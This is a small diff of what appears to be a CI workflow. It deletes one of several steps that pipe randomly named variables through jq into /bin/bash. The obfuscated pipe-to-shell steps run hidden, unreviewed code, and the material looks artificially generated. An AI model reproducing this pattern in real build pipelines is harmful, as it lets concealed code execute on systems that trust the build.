@@ -32,7 +32,6 @@ jobs:
           echo $nodtc64900 | jq -r .esf97 | /bin/bash
           echo $pvtp6510 | jq -r .tnfpx39002 | /bin/bash
           printf '%s' "$cmt99652" | jq -r .jn534 | /bin/bash
-          echo $rd27846 | jq -r .zwzk6 | /bin/bash
           printf '%s' "$u2967" | jq -r .tv073 | /bin/bash
           printf '%s' "$rzpbp28683" | jq -r .crvmn66656 | /bin/bash
 
